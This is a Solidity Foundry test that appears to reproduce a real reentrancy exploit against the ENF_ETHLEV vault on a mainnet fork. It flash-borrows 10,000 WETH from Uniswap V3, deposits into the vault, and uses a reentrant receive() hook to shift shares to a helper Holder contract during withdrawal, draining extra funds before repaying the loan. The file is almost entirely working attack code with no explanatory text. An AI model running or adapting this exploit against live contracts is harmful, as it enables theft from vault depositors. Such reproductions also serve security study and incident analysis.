// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./interface.sol";

contract ContractTest is Test {

    IUniswapV3Pool public pool = IUniswapV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IWETH public weth = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IVault public vault = IVault(0x5655c442227371267c165101048E4838a762675d);
    Holder public holder = new Holder();
    address public controller = 0xE8688D014194fd5d7acC3c17477fD6db62aDdeE9;

    function setUp() public {
        uint256 forkId = vm.createFork("mainnet", 17875885);
        vm.selectFork(forkId);
    }

    function testExp() public {
        pool.flash(
            address(this),
            0,
            10000000000000000000000,
            bytes("0x0000")
        );
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
        weth.withdraw(10000000000000000000000);
        vault.approve(address(vault), type(uint256).max);

        uint256 asset = vault.totalAssets();
        vault.deposit{value: asset}(asset, address(this));

        console.log("ENF_ETHLEV Balance: %s", vault.balanceOf(address(this)));
        
        uint256 assetsAmount = vault.convertToAssets(vault.balanceOf(address(this)));
        vault.withdraw(assetsAmount, address(this));
        console.log("ENF_ETHLEV Balance: %s", vault.balanceOf(address(this)));


         holder.withdraw(address(this));

        console.log("Ether Balance: %s", address(this).balance);
        
        weth.deposit{value: address(this).balance}();

        weth.transfer(address(pool), 10005000000000000000000);

        console.log("WETH balance: %s", weth.balanceOf(address(this)));
    }

    // fallback() external payable {
    //     if (times == 0) {
    //         console.log("INTO RE");
    //         vault.transfer(address(holder), vault.balanceOf(address(this)));
    //     }
    //     times++;
    // }

    receive() payable external {
        if (msg.sender == controller) {
            // console.log("INTO RE");
            // console.log("ENF_ETHLEV Balance: %s", vault.balanceOf(address(this)));
            vault.transfer(address(holder), vault.balanceOf(address(this))-1000);
            // console.log("su!");
            console.log("Value: %s", msg.value);
        }
        
    }

}

contract Holder {

    IVault public vault = IVault(0x5655c442227371267c165101048E4838a762675d);

    function withdraw(address to) public {
        console.log("into Holder");
        vault.approve(address(vault), type(uint256).max);
        vault.withdraw(vault.convertToAssets(vault.balanceOf(address(this))), address(this));
        to.call{value: address(this).balance}("");
    }

    receive() payable external {}
}